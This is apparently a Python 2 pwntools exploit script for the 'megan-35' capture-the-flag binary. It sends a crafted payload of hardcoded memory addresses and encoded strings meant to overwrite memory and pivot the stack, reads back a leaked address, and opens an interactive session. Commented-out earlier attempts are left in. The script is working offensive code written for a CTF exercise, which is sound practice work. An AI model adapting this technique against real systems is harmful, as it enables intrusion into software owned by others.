#!/usr/bin/python
from pwn import *

p = process("./megan-35",env={"LD_PRELOAD":"./libc.so.6"})
#p = remote("megan35.stillhackinganyway.nl", 3535)
raw_input()
# Magic = 0xf7e5a819
#buf = p32(0xffffde4c)
# Overwrite with 0x080484e0.
buf = p32(0x08049f0c)

buf += (p32(0xdeadbeef))*3
buf += p32(0xf7e53940)
#buf += p32(0xf7e5a940)
buf += p32(0xdeadbeef)
buf += p32(0x80482d6)
buf += p32(0xdeadbeef)
buf += p32(0xdeadbeef)
# Overwrite de3c with address of our code (dc20). So stack pivoting kind of.
#buf += pad
#buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesSh31RZfq"
#buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvkLy5"

# environ address.
#buf += "OdNvoHesShW1RZfyOdNvoHesShW1RZerRt=yOdNvkLy5"

buf += "OdNvoHesShW1RZfyOdNvoHesShW1RZesTIbqoHesSgXV"
########

#buf = p32(0xf7fd1dbc)
buf = p32(0xf7fcadbc)
#buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmHesShR5"
buf += "OdNvmHesSh31RZfqOdNvmHesSh31RZfqOdNvmq55"

########

log.info("Length: " + str(len(buf)))
p.sendline(buf)

leak = p.recv()
leak = p.recv()
leak = leak.split()
print leak
leak = leak[len(leak)-1]
leak = leak[0:4]
leak = u32(leak)
print hex(leak)

p.interactive()
